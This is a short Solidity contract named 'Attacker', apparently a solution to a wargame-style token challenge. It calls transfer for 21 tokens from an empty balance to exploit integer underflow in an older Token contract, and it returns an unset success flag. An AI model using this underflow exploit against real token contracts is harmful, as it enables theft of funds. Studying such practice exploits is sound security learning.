// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";

contract Attacker{

    Token token;

    constructor(Token _token)public {
        token = _token;
    }

    function attack() public returns(bool success){
        token.transfer(msg.sender, 21);
        return success;
    } 
}
